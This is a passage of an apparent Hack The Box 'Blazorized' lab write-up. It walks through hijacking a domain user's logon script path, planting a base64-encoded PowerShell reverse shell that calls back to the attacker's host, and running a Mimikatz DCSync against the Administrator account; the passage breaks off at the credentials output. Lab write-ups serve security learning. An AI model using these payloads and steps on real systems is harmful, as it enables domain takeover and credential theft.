+</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>SecurityIdentifier     : S-1-5-21-2039403211-964143010-2924010611-1107
+</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>AccessMask             : 32
+</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>AuditFlags             : None
+</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>IsInherited            : False
+</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a>AceFlags               : None
+</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>InheritedObjectAceType : All
+</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>OpaqueLength           : 0
+</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>
+</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>AceType               : AccessAllowed
+</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a>ObjectDN              : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
+</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a>ActiveDirectoryRights : ReadProperty, GenericExecute
+</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a>OpaqueLength          : 0
+</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>ObjectSID             : S-1-5-21-2039403211-964143010-2924010611-1124
+</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>InheritanceFlags      : None
+</span><span id="__span-14-47"><a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a>BinaryLength          : 36
+</span><span id="__span-14-48"><a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a>IsInherited           : False
+</span><span id="__span-14-49"><a id="__codelineno-14-49" name="__codelineno-14-49" href="#__codelineno-14-49"></a>IsCallback            : False
+</span><span id="__span-14-50"><a id="__codelineno-14-50" name="__codelineno-14-50" href="#__codelineno-14-50"></a>PropagationFlags      : None
+</span><span id="__span-14-51"><a id="__codelineno-14-51" name="__codelineno-14-51" href="#__codelineno-14-51"></a>SecurityIdentifier    : S-1-5-21-2039403211-964143010-2924010611-1107
+</span><span id="__span-14-52"><a id="__codelineno-14-52" name="__codelineno-14-52" href="#__codelineno-14-52"></a>AccessMask            : 131092
+</span><span id="__span-14-53"><a id="__codelineno-14-53" name="__codelineno-14-53" href="#__codelineno-14-53"></a>AuditFlags            : None
+</span><span id="__span-14-54"><a id="__codelineno-14-54" name="__codelineno-14-54" href="#__codelineno-14-54"></a>AceFlags              : None
+</span><span id="__span-14-55"><a id="__codelineno-14-55" name="__codelineno-14-55" href="#__codelineno-14-55"></a>AceQualifier          : AccessAllowed
+</span></code></pre></div>
+<p>We have the <code>WriteProperty</code> rights on the <code>Script-Path</code> of domain user <code>SSA_6010</code>. With this we can write a custom script that executes upon logon of the <code>SSA_6010</code> user.</p>
+<p>The logon scripts are usually stored at <code>\\DOMAIN\SYSVOL\DOMAIN\scripts\...</code>. We need to be able to write to the folder as the <code>rsa_4810</code> domain user or any other user we have compromised. To check the access rights to it we can run a quick check with <code>icalcs</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>*Evil-WinRM* PS C:\ProgramData\xpltive&gt; icacls \\blazorized.htb\sysvol\blazorized.htb\scripts\
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\ CREATOR OWNER:(OI)(CI)(IO)(F)
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>                                                NT AUTHORITY\Authenticated Users:(OI)(CI)(RX)
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>                                                NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>                                                BLAZORIZED\RSA_4810:(RX)
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>                                                BLAZORIZED\Administrator:(RX)
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>                                                BUILTIN\Administrators:(RX,W,WDAC,WO)
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>                                                BUILTIN\Administrators:(OI)(CI)(IO)(F)
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>                                                BUILTIN\Server Operators:(OI)(CI)(RX)
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>Successfully processed 1 files; Failed processing 0 files
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>*Evil-WinRM* PS C:\ProgramData\xpltive&gt; icacls \\blazorized.htb\sysvol\blazorized.htb\scripts\*
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\11DBDAEB100D BUILTIN\Administrators:(I)(F)
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>                                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\A2BFDCF13BB2 BUILTIN\Administrators:(I)(F)
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>                                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>                                                            BLAZORIZED\Administrator:(OI)(CI)(F)
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>                                                            BUILTIN\Administrators:(I)(F)
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
+</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>                                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
+</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>
+</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\CADFDDCE0BAD BUILTIN\Administrators:(I)(F)
+</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
+</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a>                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a>                                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
+</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a>
+</span><span id="__span-15-43"><a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a>\\blazorized.htb\sysvol\blazorized.htb\scripts\CAFE30DAABCB BUILTIN\Administrators:(I)(F)
+</span><span id="__span-15-44"><a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a>                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-45"><a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a>                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
+</span><span id="__span-15-46"><a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a>                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span><span id="__span-15-47"><a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a>                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span><span id="__span-15-48"><a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a>                                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
+</span><span id="__span-15-49"><a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a>
+</span><span id="__span-15-50"><a id="__codelineno-15-50" name="__codelineno-15-50" href="#__codelineno-15-50"></a>Successfully processed 5 files; Failed processing 0 files
+</span></code></pre></div>
+<p>We have full access to the <code>A32FF3AEAA23</code> folder. With this information we will plan the attack to create a malicious <code>.bat</code> file executing a PowerShell command serving to establish a reverse shell connection and put it into this directory. Finally we will modify the script path for the <code>ssa_6010</code> user in order for them to run the malicious <code>.bat</code> file upon logging in and establishing a connection to our attack host.</p>
+<p>Starting with creating the malicious <code>.bat</code>. We will once again use <code>base64</code> encoded PowerShell command of <a href="https://www.revshells.com/">revshells</a> and just save it as a <code>.bat</code> file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$ echo &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39; &gt; shelly.bat
+</span></code></pre></div>
+<p>Following this we upload it to the victim host using the <code>WinRM</code> upload functionality. Then copy it to the target path <code>\\blazorized.htb\sysvol\blazorized.htb\scripts\A32FF3AEAA23</code> that we discovered we have full access to.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; upload ./tools/shelly.bat
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Info: Uploading /home/kali/htb/blazorized/tools/shelly.bat to C:\Programdata\xpltive\shelly.bat
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>Data: 1848 bytes of 1848 bytes copied
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>Info: Upload successful!
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; cp shelly.bat \\blazorized.htb\sysvol\blazorized.htb\scripts\A32FF3AEAA23\shelly.bat
+</span></code></pre></div>
+<p>Finally we start our listener to catch the connection attempt and set the script path for the target domain user <code>ssa_6010</code> using <code>Set-DomainObject</code> of <code>PowerView</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; Set-DomainObject SSA_6010 -Set @{&#39;scriptPath&#39;=&#39;A32FF3AEAA23\shelly.bat&#39;} -Verbose
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; Get-DomainObject -Identity SSA_6010   
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>logoncount            : 3410
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>badpasswordtime       : 6/19/2024 9:58:18 AM
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>distinguishedname     : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>objectclass           : {top, person, organizationalPerson, user}
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>displayname           : SSA_6010
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>lastlogontimestamp    : 1/17/2025 3:16:08 PM
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>userprincipalname     : SSA_6010@blazorized.htb
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>name                  : SSA_6010
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>objectsid             : S-1-5-21-2039403211-964143010-2924010611-1124
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>samaccountname        : SSA_6010
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>codepage              : 0
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>samaccounttype        : USER_OBJECT
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>accountexpires        : NEVER
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>countrycode           : 0
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>whenchanged           : 1/18/2025 2:03:12 AM
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>instancetype          : 4
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>usncreated            : 29007
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a>objectguid            : 8bf3166b-e716-4f91-946c-174e1fb433ed
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>lastlogoff            : 12/31/1600 6:00:00 PM
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>dscorepropagationdata : {6/19/2024 1:24:50 PM, 6/14/2024 12:40:41 PM, 6/14/2024 12:40:28 PM, 6/14/2024 12:38:20 PM...}
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>memberof              : {CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management Users,CN=Builtin,DC=blazorized,DC=htb}
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>lastlogon             : 1/17/2025 8:03:10 PM
+</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>cn                    : SSA_6010
+</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>badpwdcount           : 0
+</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>scriptpath            : A32FF3AEAA23\shelly.bat
+</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a>whencreated           : 1/10/2024 2:32:00 PM
+</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a>primarygroupid        : 513
+</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a>pwdlastset            : 2/25/2024 11:56:55 AM
+</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>usnchanged            : 357071
+</span></code></pre></div>
+<p>And after some time we will catch the shell on our listener as <code>ssa_6010</code> on the <code>DC1</code> host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>$ rlwrap -cAr nc -lvnp 6666
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>listening on [any] 6666 ...
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>connect to [10.10.16.33] from (UNKNOWN) [10.129.231.74] 52427
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>PS C:\Windows\system32&gt; whoami
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>blazorized\ssa_6010
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>PS C:\Windows\system32&gt; hostname
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>DC1
+</span></code></pre></div>
+<h2 id="domain-compromise">Domain Compromise<a class="headerlink" href="#domain-compromise" title="Permanent link">&para;</a></h2>
+<p>From our previous <code>BloodHound</code> data we see that the <code>SUPER_SUPPORT_ADMINISTRATORS</code> group, the now compromised user <code>ssa_6010</code> is member of, has <code>DCSync</code> rights on the <code>blazorized.htb</code> domain.</p>
+<p><img alt="Blazorized-13.png" src="../images/Blazorized-13.png" /></p>
+<p>We leverage this to obtain the NTLM hash of the domain administrator using <code>Mimikatz</code>. We transfer the tool over and perform the <code>DCSync</code> attack; targeting the domain administrator.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>PS C:\ProgramData\xpltive&gt; .\mimikatz.exe &quot;lsadump::dcsync /user:Administrator /domain:blazorized.htb&quot; exit                                 
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>mimikatz(commandline) # lsadump::dcsync /user:Administrator /domain:blazorized.htb
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>[DC] &#39;blazorized.htb&#39; will be the domain
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>[DC] &#39;DC1.blazorized.htb&#39; will be the DC server
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>[DC] &#39;Administrator&#39; will be the user account
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>[rpc] Service  : ldap
+</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>
+</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>Object RDN           : Administrator
+</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>
+</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>** SAM ACCOUNT **
+</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>
+</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>SAM Username         : Administrator
+</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>Account Type         : 30000000 ( USER_OBJECT )
+</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>Account expiration   : 
+</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>Password last change : 2/25/2024 11:54:43 AM
+</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a>Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
+</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a>Object Relative ID   : 500
+</span><span id="__span-20-28"><a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a>
+</span><span id="__span-20-29"><a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a>Credentials:
